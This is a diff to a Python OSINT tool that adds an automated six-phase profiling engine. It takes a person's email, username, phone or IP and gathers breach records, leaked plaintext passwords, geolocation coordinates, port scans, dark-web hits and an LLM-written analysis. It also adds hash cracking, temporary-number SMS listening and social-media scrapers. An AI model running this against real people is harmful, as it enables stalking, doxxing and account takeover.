     source = input(f"{Wh}[?] Source: {Gr}(1) Local image  (2) Username avatar scan{Wh}: {Gr}").strip()
@@ -5218,7 +8854,7 @@ def age_gender_menu():
         print(f"\n{Y}[*] Analyzing image: {os.path.basename(path)}{Wh}")
         result = detect_age_gender(path)
 
-        print(f"\n{Wh}─── Results ───")
+        print(f"\n{Wh} Results ")
         if result.get("error") and not result.get("age"):
             print(f"{Y}[!] {result['error']}{Wh}")
         print(f"{Wh} Faces Detected : {Gr}{result.get('faces_detected', 0)}")
@@ -5245,7 +8881,7 @@ def age_gender_menu():
         print(f"\n{Y}[*] Analyzing profile images for '{username}'...{Wh}")
         results = analyze_profile_images_osint(username)
 
-        print(f"\n{Wh}─── Results ───")
+        print(f"\n{Wh} Results ")
         print(f"{Wh} Images Analyzed: {Gr}{results['images_analyzed']}")
         print(f"{Wh} Faces Detected : {Gr}{results['faces_detected']}")
 
@@ -5258,6 +8894,1332 @@ def age_gender_menu():
                     print(f"   Gender : {Gr}{entry['gender']} ({entry.get('gender_confidence', 'N/A')})")
 
     input(f"\n{Wh}[+] Press Enter")
+
+# 
+# INVESTIGATION ORCHESTRATOR — DeepDive Engine
+# 
+
+@dataclass
+class Finding:
+    category: str
+    value: str
+    source: str
+    confidence: str = "MEDIUM"
+    metadata: Dict = None
+
+    def to_dict(self):
+        return {"category": self.category, "value": self.value, "source": self.source, "confidence": self.confidence, "metadata": self.metadata or {}}
+
+
+@dataclass
+class UnifiedProfile:
+    target: str
+    target_type: str
+    timestamp: str = ""
+    findings: List[Finding] = None
+    pivot_graph: Dict = None
+
+    def __post_init__(self):
+        self.timestamp = datetime.now().isoformat()
+        self.findings = self.findings or []
+        self.pivot_graph = self.pivot_graph or {}
+
+    def add(self, cat, val, src, conf="MEDIUM", meta=None):
+        self.findings.append(Finding(cat, val, src, conf, meta))
+
+    def get_by_category(self, cat):
+        return [f for f in self.findings if f.category == cat]
+
+    def all_values(self, cat):
+        return list(set(f.value for f in self.findings if f.category == cat))
+
+    def to_dict(self):
+        return {
+            "target": self.target, "target_type": self.target_type,
+            "timestamp": self.timestamp,
+            "findings": [f.to_dict() for f in self.findings],
+            "pivot_graph": self.pivot_graph,
+        }
+
+
+class InvestigationOrchestrator:
+    """DeepDive — Unified Intelligence Workflow Engine"""
+
+    def __init__(self, target: str):
+        self.target = target.strip()
+        self.target_type = detect_target_type(self.target)
+        self.profile = UnifiedProfile(self.target, self.target_type)
+        self.start_time = time.time()
+        self.phase_times = {}
+
+    def _phase_header(self, phase: int, title: str):
+        elapsed = time.time() - self.start_time
+        print(f"\n {Wh}{'='*55}")
+        print(f" {R} PHASE {phase}: {title}")
+        print(f" {Wh}{'='*55}")
+        print(f" {Y}[⏱ {elapsed:.1f}s elapsed]{Wh}")
+
+    def _phase_footer(self, phase: int):
+        self.phase_times[f"phase_{phase}"] = time.time() - self.start_time - sum(self.phase_times.values())
+
+    def _extract_from_results(self, results, source_name):
+        """استخراج الإيميلات والأرقام والحسابات من أي نص أو ديكت"""
+        emails, phones, usernames, names = set(), set(), set(), set()
+        raw = str(results)
+        for m in re.findall(r'[\w.+-]+@[\w-]+\.[\w.-]+', raw):
+            if "noreply" not in m and "example" not in m:
+                emails.add(m.lower())
+        for m in re.findall(r'\+?\d{1,4}[\s-]?\d{6,12}', raw):
+            clean = re.sub(r'\s', '', m)
+            if len(clean) >= 8:
+                phones.add(clean)
+        for src_text in ([results] if isinstance(results, str) else [str(results)]):
+            for m in re.findall(r'(?:username|user|handle)[:\s]+([a-zA-Z0-9_.\-]{3,30})', src_text, re.I):
+                usernames.add(m.lower())
+        pattern_analyzer = PatternAnalyzer()
+        if isinstance(results, dict):
+            for v in results.values():
+                if isinstance(v, str) and len(v) > 20:
+                    parsed = pattern_analyzer.analyze(v)
+                    for e in parsed.get("emails", []):
+                        emails.add(e["value"])
+                    for n in parsed.get("names", []):
+                        names.add(n["value"])
+        return emails, phones, usernames, names
+
+    def run(self):
+        print(f"\n {R}{'='*55}")
+        print(f" {Gr} DEEPDIVE — UNIFIED INTELLIGENCE WORKFLOW")
+        print(f" {Wh}{'='*55}")
+        print(f"{Wh}  Target     : {C}{self.target}")
+        print(f"{Wh}  Type       : {Gr}{self.target_type}")
+        print(f"{Wh}  Started    : {Y}{datetime.now().isoformat()}")
+        print(f"{Wh}{'='*55}\n")
+
+        #  Phase 1: Passive Recon 
+        self._phase_header(1, "PASSIVE RECONNAISSANCE")
+        self._phase1_passive()
+        self._phase_footer(1)
+
+        #  Phase 2: Surface Web 
+        self._phase_header(2, "SURFACE WEB OSINT")
+        self._phase2_surface_web()
+        self._phase_footer(2)
+
+        #  Phase 3: Technical Analysis 
+        self._phase_header(3, "TECHNICAL ANALYSIS")
+        self._phase3_technical()
+        self._phase_footer(3)
+
+        #  Phase 4: Deep/Dark Web 
+        self._phase_header(4, "DEEP & DARK WEB")
+        self._phase4_deep_dark()
+        self._phase_footer(4)
+
+        #  Phase 5: Correlation & Profile Building 
+        self._phase_header(5, "CORRELATION & UNIFIED PROFILE")
+        self._phase5_correlation()
+        self._phase_footer(5)
+
+        #  Phase 6: Reporting 
+        self._phase_header(6, "REPORTING & VISUALIZATION")
+        self._phase6_reporting()
+        self._phase_footer(6)
+
+        self._show_summary()
+
+    def _phase1_passive(self):
+        """Phase 1: جمع المعلومات الأساسية بدون تفاعل"""
+        t = self.target_type
+
+        if t == "email":
+            domain = self.target.split("@")[1]
+            username = self.target.split("@")[0]
+            self.profile.add("domain", domain, "email_parse", "HIGH")
+            self.profile.add("username", username, "email_parse", "MEDIUM")
+            print(f"  {Gr}{Wh} Domain extracted: {C}{domain}")
+            print(f"  {Gr}{Wh} Username extracted: {C}{username}")
+
+            print(f"  {Y}[*] Checking breaches (HIBP + HudsonRock + ProxyNova)...{Wh}")
+            breaches = check_email_breaches_advanced(self.target)
+            bc = breaches.get("total_breaches", 0)
+            if bc > 0:
+                self.profile.add("breach", f"{bc} breaches", "hibp/hudson", "HIGH", breaches)
+                print(f"  {R}  [!] Found in {bc} breaches{Wh}")
+            passwords = breaches.get("passwords", [])
+            if passwords:
+                self.profile.add("password", passwords[0], "proxynova", "HIGH")
+                print(f"  {R}  [!] Leaked password found{Wh}")
+
+        elif t == "username":
+            print(f"  {Y}[*] Generating email permutations...{Wh}")
+            common_domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com', 'icloud.com']
+            for d in common_domains:
+                self.profile.add("possible_email", f"{self.target}@{d}", "email_permute", "LOW")
+            print(f"  {Gr}{Wh} 5 possible emails generated")
+
+        elif t == "phone":
+            print(f"  {Y}[*] Extracting country code...{Wh}")
+            for code in sorted(COUNTRY_CODES.keys(), key=len, reverse=True):
+                clean = re.sub(r'\D', '', self.target)
+                if clean.startswith(code) or self.target.startswith(f"+{code}"):
+                    self.profile.add("country", COUNTRY_CODES[code], "phone_parse", "HIGH")
+                    print(f"  {Gr}{Wh} Country: {C}{COUNTRY_CODES[code]}")
+                    break
+
+        elif t == "domain":
+            print(f"  {Y}[*] Looking up DNS for {self.target}...{Wh}")
+            dns_data = dns_lookup(self.target)
+            ip = dns_data.get("A", "")
+            if ip and ip != "Not found":
+                self.profile.add("ip", ip, "dns_lookup", "HIGH")
+                print(f"  {Gr}{Wh} IP resolved: {C}{ip}")
+
+        print(f"  {Gr} Phase 1 complete{Wh}")
+
+    def _phase2_surface_web(self):
+        """Phase 2: البحث في الويب السطحي"""
+        t = self.target_type
+        search_target = self.target
+
+        if t == "email":
+            search_target = self.target.split("@")[0]
+
+        # Username search on platforms
+        print(f"  {Y}[*] Username search across platforms...{Wh}")
+        try:
+            engine = WhatsMyNameEngine()
+            wmn_results = engine.search(search_target, categories=["social", "coding"], exclude_protected=True)
+            for site in wmn_results.get("found", [])[:20]:
+                self.profile.add("social_profile", site["name"], "whatsmyname", "HIGH", {"url": site["url"]})
+            print(f"  {Gr}  [+] Found on {len(wmn_results['found'])}/{wmn_results['total']} sites{Wh}")
+        except Exception as e:
+            print(f"  {Y}  [!] WMN error: {str(e)[:40]}{Wh}")
+
+        # GitHub search
+        print(f"  {Y}[*] GitHub OSINT search...{Wh}")
+        try:
+            gh = github_search(search_target)
+            if gh.get("users"):
+                for u in gh["users"][:5]:
+                    self.profile.add("github_user", u["login"], "github_osint", "HIGH", u)
+                    if u.get("email"):
+                        self.profile.add("email", u["email"], "github_profile", "HIGH")
+                    if u.get("location"):
+                        self.profile.add("location", u["location"], "github_profile", "MEDIUM")
+                print(f"  {Gr}  [+] {len(gh['users'])} users, {len(gh['repos'])} repos found{Wh}")
+            if gh.get("emails"):
+                for e in gh["emails"]:
+                    self.profile.add("email", e["email"], "github_commit", "HIGH")
+        except Exception as e:
+            print(f"  {Y}  [!] GitHub error: {str(e)[:40]}{Wh}")
+
+        # Pastebin search
+        print(f"  {Y}[*] Pastebin & psbdmp search...{Wh}")
+        try:
+            pb = pastebin_search(search_target)
+            total_pastes = sum(len(v) for v in pb.values())
+            if total_pastes:
+                self.profile.add("paste", f"{total_pastes} pastes found", "pastebin_osint", "MEDIUM", pb)
+                print(f"  {Gr}  [+] {total_pastes} pastes/leaks found{Wh}")
+        except Exception as e:
+            print(f"  {Y}  [!] Pastebin error{Wh}")
+
+        # TeleSpotter multi-engine search
+        print(f"  {Y}[*] Multi-engine web search (Google, Bing, DuckDuckGo)...{Wh}")
+        try:
+            sem = SearchEngineManager()
+            web_results = sem.search_all(search_target)
+            for eng, urls in web_results.items():
+                if urls:
+                    self.profile.add("web_result", f"{eng}: {len(urls)} URLs", "web_search", "MEDIUM")
+            print(f"  {Gr}  [+] Web search completed{Wh}")
+
+            # Pattern analysis on found URLs
+            combined = ""
+            all_urls = []
+            for urls in web_results.values():
+                all_urls.extend(urls[:5])
+            for url in all_urls[:8]:
+                try:
+                    r = get_session().get(url, timeout=5)
+                    combined += r.text + "\n"
+                except:
+                    pass
+            if combined:
+                pa = PatternAnalyzer()
+                analysis = pa.analyze(combined)
+                for e in analysis.get("emails", []):
+                    self.profile.add("email", e["value"], "web_pattern", e.get("confidence", "MEDIUM"))
+                for n in analysis.get("names", []):
+                    self.profile.add("name", n["value"], "web_pattern", n.get("confidence", "MEDIUM"))
+                for s in analysis.get("social_profiles", []):
+                    self.profile.add("social_url", s["url"], "web_pattern", "MEDIUM")
+                print(f"  {Gr}  [+] Extracted {len(analysis['emails'])} emails, {len(analysis['names'])} names from pages{Wh}")
+        except Exception as e:
+            print(f"  {Y}  [!] Web search error: {str(e)[:40]}{Wh}")
+
+        print(f"  {Gr} Phase 2 complete{Wh}")
+
+    def _phase3_technical(self):
+        """Phase 3: التحليل التقني"""
+        t = self.target_type
+        collected_ips = self.profile.all_values("ip")
+        collected_domains = self.profile.all_values("domain")
+
+        # Add the target itself if applicable
+        if t == "domain":
+            collected_domains.append(self.target)
+        elif t == "ip":
+            collected_ips.append(self.target)
+        elif t == "email":
+            domain = self.target.split("@")[1]
+            if domain not in collected_domains:
+                collected_domains.append(domain)
+
+        # Enrich each IP
+        for ip in collected_ips:
+            if not validate_ip(ip):
+                continue
+            print(f"  {Y}[*] Analyzing IP: {ip}{Wh}")
+            try:
+                ip_data = get_ip_info(ip)
+                if ip_data:
+                    self.profile.add("geo", f"{ip_data.get('city', '?')}, {ip_data.get('country', '?')}", "ip_geo", "HIGH", ip_data)
+                    self.profile.add("isp", ip_data.get("connection", {}).get("isp", ip_data.get("isp", "?")), "ip_geo", "MEDIUM")
+                    self.profile.add("asn", ip_data.get("connection", {}).get("asn", ip_data.get("as", "?")), "ip_geo", "MEDIUM")
+                    print(f"  {Gr}  [+] Location: {C}{ip_data.get('city', '?')}, {ip_data.get('country', '?')}")
+
+                    lat = ip_data.get("latitude", ip_data.get("lat"))
+                    lon = ip_data.get("longitude", ip_data.get("lon"))
+                    if lat and lon and lat != "N/A" and lon != "N/A":
+                        try:
+                            lat_f, lon_f = float(lat), float(lon)
+                            self.profile.add("coordinates", f"{lat_f},{lon_f}", "ip_geo", "HIGH")
+                            maps_url = f"https://www.google.com/maps?q={lat_f},{lon_f}"
+                            print(f"  {Wh}  Maps: {C}{maps_url}")
+                        except:
+                            pass
+
+                # Port scan (quick)
+                print(f"  {Y}  [*] Quick port scan...{Wh}")
+                ports = port_scan(ip)
+                if ports:
+                    open_ports = [f"{p}" for p in sorted(ports.keys())]
+                    self.profile.add("open_ports", ", ".join(open_ports), "port_scan", "MEDIUM")
+                    print(f"  {Gr}  [+] Open ports: {', '.join(open_ports)}")
+
+                # Reputation
+                rep = check_ip_reputation_free(ip)
+                if rep.get("abuse_score", 0) > 0:
+                    self.profile.add("abuse_score", str(rep["abuse_score"]), "ip_reputation", "MEDIUM")
+                if rep.get("is_tor"):
+                    self.profile.add("tor_node", "yes", "ip_reputation", "HIGH")
+                    print(f"  {R}  [!] TOR exit node detected{Wh}")
+                if rep.get("is_vpn"):
+                    self.profile.add("vpn", "yes", "ip_reputation", "MEDIUM")
+            except Exception as e:
+                print(f"  {Y}  [!] IP analysis error: {str(e)[:40]}{Wh}")
+
+        # Enrich each domain
+        for domain in collected_domains:
+            print(f"  {Y}[*] Analyzing domain: {domain}{Wh}")
+            try:
+                # DNS full records
+                dns = dns_records_full(domain)
+                if dns.get("A") and dns["A"] != "N/A":
+                    ip = dns["A"]
+                    if ip not in collected_ips:
+                        self.profile.add("ip", ip, "domain_dns", "HIGH")
+                        print(f"  {Gr}  [+] Resolved IP: {C}{ip}")
+
+                # Subdomains
+                subs = get_subdomains_crt(domain)
+                if subs:
+                    self.profile.add("subdomains", str(len(subs)), "crt_sh", "MEDIUM", {"list": subs[:20]})
+                    print(f"  {Gr}  [+] {len(subs)} subdomains found via CRT.sh")
+
+                # SSL
+                ssl_info = check_ssl_cert(domain)
+                if ssl_info and "error" not in ssl_info:
+                    self.profile.add("ssl_issuer", ssl_info.get("Issuer", "?"), "ssl_check", "MEDIUM")
+                    self.profile.add("ssl_expiry", ssl_info.get("Expiry", "?"), "ssl_check", "MEDIUM")
+
+                # Technologies
+                tech = get_domain_technologies(domain)
+                for category, items in tech.items():
+                    if items:
+                        self.profile.add(f"tech_{category}", ", ".join(items), "tech_detect", "MEDIUM")
+
+                # Wayback
+                wb = wayback_check(domain)
+                if wb.get("available"):
+                    self.profile.add("wayback", wb.get("url", ""), "wayback", "LOW")
+                    print(f"  {Wh}  [+] Archived version exists")
+
+            except Exception as e:
+                print(f"  {Y}  [!] Domain analysis error{Wh}")
+
+        # If email target, do SMTP check
+        if t == "email":
+            print(f"  {Y}[*] SMTP verification for {self.target}...{Wh}")
+            try:
+                smtp = verify_email_smtp_advanced(self.target)
+                self.profile.add("smtp_valid", str(smtp.get("valid", False)), "smtp_check", "HIGH")
+                if smtp.get("valid"):
+                    print(f"  {Gr}  [+] Email is valid (SMTP confirmed){Wh}")
+                if smtp.get("mx_records"):
+                    self.profile.add("mx", str([m["exchange"] for m in smtp["mx_records"][:3]]), "smtp_check", "MEDIUM")
+            except Exception as e:
+                print(f"  {Y}  [!] SMTP error{Wh}")
+
+        print(f"  {Gr} Phase 3 complete{Wh}")
+
+    def _phase4_deep_dark(self):
+        """Phase 4: البحث في الويب العميق والمظلم + خروقات البيانات"""
+        # --- DeHashed ---
+        if DEHASHED_CONFIG["email"] and DEHASHED_CONFIG["api_key"]:
+            print(f"  {Y}[*] DeHashed breach search...{Wh}")
+            for cat in ["email", "username", "phone", "ip_address", "domain", "name"]:
+                vals = self.profile.all_values(cat)
+                if not vals:
+                    continue
+                for val in vals[:3]:  # Limit to 3 queries per category
+                    try:
+                        dh = search_dehashed(val, cat)
+                        if "error" not in dh and dh.get("total", 0) > 0:
+                            self.profile.add("dehashed_hit", f"{dh['total']} entries for {val}", "dehashed", "HIGH", dh)
+                            print(f"  {R}  [!] DeHashed: {dh['total']} entries for {val}{Wh}")
+                            for entry in dh.get("results", [])[:5]:
+                                if entry.get("password") and entry["password"] != "N/A" and entry["password"] != "***":
+                                    self.profile.add("leaked_password", entry["password"][:20], "dehashed", "CRITICAL")
+                                if entry.get("email") and entry["email"] != "N/A":
+                                    self.profile.add("email", entry["email"], "dehashed", "HIGH")
+                                if entry.get("phone") and entry["phone"] != "N/A":
+                                    self.profile.add("phone", entry["phone"], "dehashed", "HIGH")
+                                break
+                    except:
+                        pass
+        else:
+            print(f"  {Y}  [!] DeHashed not configured (set DEHASHED_CONFIG){Wh}")
+
+        # --- Dark Web ---
+        tor_avail = False
+        try:
+            tor_avail = check_tor_available()
+        except:
+            pass
+
+        if tor_avail:
+            print(f"  {Y}[*] Dark web search via Ahmia...{Wh}")
+            search_terms = self.profile.all_values("username") + self.profile.all_values("email") + self.profile.all_values("name") + [self.target]
+            for term in search_terms[:3]:
+                try:
+                    dw = search_darkweb(term)
+                    if dw.get("ahmia", {}).get("total", 0) > 0:
+                        self.profile.add("darkweb_hit", f"{dw['ahmia']['total']} onion results for {term}", "darkweb", "HIGH", dw)
+                        print(f"  {Gr}  [+] Dark web: {dw['ahmia']['total']} results for {term}")
+                        for link in dw.get("ahmia", {}).get("onion_links", [])[:5]:
+                            self.profile.add("onion_link", link, "darkweb", "MEDIUM")
+                except:
+                    pass
+        else:
+            print(f"  {Y}  [!] Tor not available — dark web search skipped{Wh}")
+
+        print(f"  {Gr} Phase 4 complete{Wh}")
+
+    def _phase5_correlation(self):
+        """Phase 5: الربط وبناء الملف الموحد"""
+        print(f"  {Y}[*] Building unified profile from all {len(self.profile.findings)} findings...{Wh}")
+
+        # إحصائيات
+        cats = {}
+        for f in self.profile.findings:
+            cats[f.category] = cats.get(f.category, 0) + 1
+
+        print(f"  {Gr}  [+] Findings by category:{Wh}")
+        for cat, count in sorted(cats.items(), key=lambda x: -x[1]):
+            print(f"      {Wh}{cat:<20}: {C}{count}{Wh}")
+
+        emails = self.profile.all_values("email")
+        phones = self.profile.all_values("phone")
+        usernames = self.profile.all_values("username")
+        domains = self.profile.all_values("domain")
+        names = self.profile.all_values("name")
+        ips = self.profile.all_values("ip")
+
+        # بناء الرسم البياني للربط
+        pivot_graph = {}
+        pivot_graph["target"] = self.target
+        pivot_graph["edges"] = []
+        if emails:
+            pivot_graph["emails"] = emails
+        if phones:
+            pivot_graph["phones"] = phones
+        if usernames:
+            pivot_graph["usernames"] = usernames
+        if domains:
+            pivot_graph["domains"] = domains
+        if names:
+            pivot_graph["names"] = names
+        if ips:
+            pivot_graph["ips"] = ips
+
+        self.profile.pivot_graph = pivot_graph
+
+        # Reputation score
+        print(f"  {Y}[*] Calculating reputation score...{Wh}")
+        try:
+            rep_engine = ReputationEngine()
+            breach_count = len(self.profile.get_by_category("breach"))
+            social_count = len(self.profile.get_by_category("social_profile"))
+            leak_count = len(self.profile.get_by_category("leaked_password"))
+            payload = {
+                "results": {
+                    "breaches": [{"name": "breach"}] * breach_count if breach_count else [],
+                    "social_footprint": [{"exists": True}] * social_count if social_count else [],
+                }
+            }
+            rep_result = rep_engine.score(payload)
+            self.profile.add("reputation_score", f"{rep_result['score']}/100", "reputation_engine", "HIGH", rep_result)
+            risk = rep_result["risk_level"]
+            risk_color = {"CRITICAL": R, "HIGH": Y, "MEDIUM": Y, "LOW": Gr}.get(risk, Wh)
+            print(f"  {Wh}  Risk Score: {risk_color}{rep_result['score']}/100 ({risk}){Wh}")
+        except Exception as e:
+            print(f"  {Y}  [!] Reputation error: {str(e)[:40]}{Wh}")
+
+        print(f"  {Gr}  [+] Unified profile: {len(emails)} emails, {len(phones)} phones, {len(usernames)} usernames, {len(domains)} domains, {len(ips)} IPs, {len(names)} names")
+        print(f"  {Gr} Phase 5 complete{Wh}")
+
+    def _phase6_reporting(self):
+        """Phase 6: التقرير النهائي والتصدير والرسم"""
+        # Save JSON report
+        report_data = self.profile.to_dict()
+        report_data["phase_times"] = self.phase_times
+        report_data["total_duration"] = time.time() - self.start_time
+
+        result = ScanResult(
+            timestamp=datetime.now().isoformat(),
+            scan_type="deepdive",
+            target=self.target,
+            data=report_data
+        )
+        saved_path = save_report(result)
+
+        # Try AI correlation if Groq is available
+        if Groq is not None:
+            api_key = os.environ.get("GROQ_API_KEY")
+            if api_key:
+                print(f"  {Y}[*] Running AI correlation via Groq...{Wh}")
+                try:
+                    client = Groq(api_key=api_key)
+                    summary = {
+                        "target": self.target,
+                        "type": self.target_type,
+                        "emails": self.profile.all_values("email"),
+                        "phones": self.profile.all_values("phone"),
+                        "usernames": self.profile.all_values("username"),
+                        "domains": self.profile.all_values("domain"),
+                        "ips": self.profile.all_values("ip"),
+                        "names": self.profile.all_values("name"),
+                        "breaches": [f.value for f in self.profile.findings if f.category == "breach"],
+                        "social_profiles": [f.value for f in self.profile.findings if f.category == "social_profile"],
+                    }
+                    system_prompt = """You are an elite OSINT analyst. Analyze this intelligence data and provide:
+1. Summary of what you know about the target
+2. Cross-correlations between data points
+3. Risk assessment (score 0-100)
+4. Inferred insights not explicitly in data
+5. Recommended next investigation steps
+Respond concisely with clear sections."""
+                    completion = client.chat.completions.create(
+                        model=GROQ_MODEL,
+                        messages=[
+                            {"role": "system", "content": system_prompt},
+                            {"role": "user", "content": json.dumps(summary, indent=2)}
+                        ],
+                        temperature=0.7, max_tokens=2048,
+                    )
+                    ai_analysis = completion.choices[0].message.content
+                    print(f"\n  {Gr} AI INSIGHTS {RS}")
+                    for line in ai_analysis.split("\n"):
+                        print(f"  {Wh}{line}")
+                    print(f"  {Wh}{''*30}{RS}")
+                    self.profile.add("ai_analysis", ai_analysis[:200], "groq_correlation", "HIGH")
+                except Exception as e:
+                    print(f"  {Y}  [!] Groq error: {str(e)[:40]}{Wh}")
+
+        # Try to generate visualization graph
+        print(f"  {Y}[*] Generating investigation graph...{Wh}")
+        try:
+            import networkx as nx
+            graph_path = str(Path(CONFIG["output_dir"]) / f"deepdive_graph_{int(time.time())}.html")
+            if "root" not in report_data:
+                report_data["root"] = {
+                    "type": self.target_type, "value": self.target,
+                    "findings": {}, "children": [
+                        {"type": cat, "value": val, "findings": {}, "children": []}
+                        for f in self.profile.findings[:50]
+                        for cat, val in [(f.category, f.value)]
+                    ]
+                }
+            viz_result = create_investigation_graph(report_data, graph_path)
+            if viz_result and os.path.exists(viz_result):
+                print(f"  {Gr}  [+] Graph saved: {C}{viz_result}")
+        except Exception as e:
+            print(f"  {Y}  [!] Graph generation skipped: {str(e)[:40]}{Wh}")
+
+        print(f"  {Gr} Phase 6 complete{Wh}")
+
+    def _show_summary(self):
+        """عرض الملخص النهائي"""
+        total = time.time() - self.start_time
+
+        print(f"\n {Wh}{'='*55}")
+        print(f" {Gr} DEEPDIVE INVESTIGATION COMPLETE")
+        print(f" {Wh}{'='*55}")
+        print(f"  {Wh}Target      : {C}{self.target}")
+        print(f"  {Wh}Type        : {Gr}{self.target_type}")
+        print(f"  {Wh}Duration    : {Y}{total:.1f}s")
+        print(f"  {Wh}Findings    : {C}{len(self.profile.findings)} data points")
+
+        # Show most critical findings
+        critical = [f for f in self.profile.findings if f.confidence == "CRITICAL"]
+        high = [f for f in self.profile.findings if f.confidence == "HIGH"]
+        if critical:
+            print(f"  {R}   {len(critical)} critical findings{Wh}")
+            for c in critical[:3]:
+                print(f"      {R}! {c.category}: {str(c.value)[:60]}")
+        if high:
+            print(f"  {Gr}   {len(high)} high-confidence findings{Wh}")
+
+        print(f"\n  {Wh}Phase times:")
+        for ph, dur in self.phase_times.items():
+            print(f"      {ph}: {dur:.1f}s")
+
+        print(f"\n  {Gr}[] Full report saved to reports/{Wh}")
+        print(f"  {Y}[*] Next steps: Use AI Correlation (22) or Visualization (23) for deeper analysis{Wh}")
+        print(f"  {Wh}{'='*55}\n")
+
+
+def deepdive_menu():
+    """DeepDive Investigation — Unified Intelligence Workflow"""
+    print(f"\n {Wh}{'='*55}")
+    print(f" {R} DEEPDIVE — UNIFIED INTELLIGENCE WORKFLOW")
+    print(f" {Wh}{'='*55}")
+    print(f"{Y}[!] 6-Phase automated investigation{Wh}")
+    print(f"{Y}    1. Passive Recon    2. Surface Web    3. Technical{Wh}")
+    print(f"{Y}    4. Deep/Dark Web    5. Correlation     6. Reporting{Wh}")
+    print(f"{Wh}")
+    print(f"{Wh}  Supports: {C}email, username, phone, domain, IP, name{Wh}")
+
+    target = input(f"\n{Wh}[+] Enter target: {Gr}").strip()
+    if not target:
+        return
+
+    try:
+        target = sanitize_target(target)
+    except ValueError as e:
+        print(f"{R}[!] {e}{Wh}")
+        input(f"\n[+] Press Enter")
+        return
+
+    ttype = detect_target_type(target)
+    print(f"\n{Wh}  Detected type: {Gr}{ttype}{Wh}")
+    confirm = input(f"\n{Wh}[?] Start DeepDive investigation? {Gr}(y/n){Wh}: {Gr}").strip().lower()
+    if confirm != 'y':
+        print(f"{Y}[!] Cancelled{Wh}")
+        input(f"\n[+] Press Enter")
+        return
+
+    orchestrator = InvestigationOrchestrator(target)
+    try:
+        orchestrator.run()
+    except KeyboardInterrupt:
+        print(f"\n{Y}[!] Investigation interrupted{Wh}")
+    except Exception as e:
+        print(f"\n{R}[!] DeepDive error: {e}{Wh}")
+        import traceback
+        traceback.print_exc()
+
+    input(f"\n{Wh}[+] Press Enter")
+
+
+# 
+# LITTLEBROTHER INTEGRATIONS — Imported Features
+# 
+
+class SMSReceiver:
+    """Free SMS Reception via temporary numbers (ported from LittleBrother)"""
+    
+    def search_servers(self) -> List[Dict]:
+        servers = []
+        try:
+            url = "https://www.receive-sms-online.info/"
+            resp = requests.get(url, timeout=10)
+            page = resp.content.decode('utf-8')
+            matches = re.findall(r"<a href=\"([0-9]+)-([a-zA-Z0-9_]+)", page)
+            for i, (num, country) in enumerate(matches, 1):
+                servers.append({"id": i, "number": num, "country": country})
+            self._base_url = url
+        except: pass
+        return servers
+    
+    def fetch_messages(self, number_path: str) -> Dict:
+        result = {"from_users": [], "messages": [], "times": [], "count": 0, "latest_message": "", "latest_from": ""}
+        try:
+            url = f"https://www.receive-sms-online.info/{number_path}"
+            resp = requests.get(url, timeout=10)
+            page = resp.content.decode('utf-8')
+            from_users = re.findall(r'data-label="From   :">([a-zA-Z0-9_ +]+)</td>', page)
+            messages = re.findall(r'data-label="Message:">(.*)</td>', page)
+            times = re.findall(r'data-label="Added:">(.*)</td>', page)
+            result["from_users"] = from_users
+            result["messages"] = messages
+            result["times"] = times
+            result["count"] = len(from_users)
+            if len(messages) > 1:
+                result["latest_message"] = messages[1]
+                result["latest_from"] = from_users[1] if len(from_users) > 1 else ""
+        except: pass
+        return result
+    
+    def listen_live(self, number_path: str, poll_interval: int = 3):
+        """Live-listen for new SMS messages"""
+        initial = self.fetch_messages(number_path)
+        last_msg = initial["latest_message"]
+        print(f"{Y}[*] Listening for SMS on {number_path}...{Wh}")
+        print(f"{Wh}    Last: {last_msg}")
+        print(f"{Y}    Press Ctrl+C to stop{Wh}")
+        try:
+            while True:
+                time.sleep(poll_interval)
+                current = self.fetch_messages(number_path)
+                new_msg = current["latest_message"]
+                if new_msg and new_msg != last_msg:
+                    print(f"\n{Gr}[+] NEW SMS!{Wh}")
+                    print(f"    {Wh}From: {C}{current['latest_from']}")
+                    print(f"    {Wh}Msg:  {Gr}{new_msg}")
+                    last_msg = new_msg
+        except KeyboardInterrupt:
+            print(f"\n{Y}[-] Stopped listening{Wh}")
+
+
+class HashDecryptor:
+    """Hash decryption via lea.kz API (ported from LittleBrother)"""
+    
+    def decrypt(self, hash_value: str) -> Optional[str]:
+        try:
+            resp = requests.get(f"https://lea.kz/api/hash/{hash_value}", timeout=10)
+            data = resp.json()
+            return data.get("password")
+        except: return None
+    
+    def check_email_leak(self, email: str) -> Optional[str]:
+        try:
+            resp = requests.get(f"https://lea.kz/api/email/{email}", timeout=10)
+            data = resp.json()
+            return data.get("leaked")
+        except: return None
+
+
+class InstagramScraper:
+    """Instagram profile data extraction from embedded JSON (ported from LittleBrother)"""
+    
+    def get_profile(self, username: str) -> Dict:
+        result = {"username": username, "found": False}
+        try:
+            if username.startswith("http"):
+                url = username
+            else:
+                url = f"https://instagram.com/{username}"
+            page = requests.get(url, timeout=10, headers={"User-Agent": random.choice(CONFIG["user_agents"])})
+            html = page.content.decode('utf-8')
+            scripts = re.findall(r"<script type=\"text/javascript\">(.*?);</script>", html, re.DOTALL)
+            json_raw = None
+            for s in scripts:
+                if "window._sharedData" in s:
+                    json_raw = s.replace("window._sharedData = ", "").strip()
+                    break
+            if not json_raw:
+                return result
+            values = json.loads(json_raw)
+            user = values['entry_data']['ProfilePage'][0]['graphql']['user']
+            result.update({
+                "found": True,
+                "id": user['id'],
+                "username": user['username'],
+                "full_name": user['full_name'],
+                "biography": user['biography'],
+                "private": user['is_private'],
+                "verified": user['is_verified'],
+                "followers": user['edge_followed_by']['count'],
+                "following": user['edge_follow']['count'],
+                "posts": user['edge_owner_to_timeline_media']['count'],
+                "profile_pic_hd": user['profile_pic_url_hd'],
+                "external_url": user.get('external_url', ''),
+                "business": user.get('is_business_account', False),
+            })
+        except: pass
+        return result
+
+
+class TwitterScraper:
+    """Twitter profile data extraction from embedded JSON (ported from LittleBrother)"""
+    
+    def search_users(self, query: str) -> List[Dict]:
+        results = []
+        try:
+            q = query.replace(" ", "%20")
+            resp = requests.get(f"https://twitter.com/search?f=users&vertical=default&q={q}", 
+                              headers={"User-Agent": random.choice(CONFIG["user_agents"])}, timeout=10)
+            datas = re.findall(r'data-screen-name="(.*?)" data-name="(.*?)"', resp.text)
+            for screen_name, name in datas[:20]:
+                results.append({"screen_name": screen_name, "name": name})
+        except: pass
+        return results
+    
+    def get_profile(self, username: str) -> Dict:
+        result = {"username": username, "found": False}
+        try:
+            if username.startswith("http"):
+                url = username
+            else:
+                url = f"https://twitter.com/{username}"
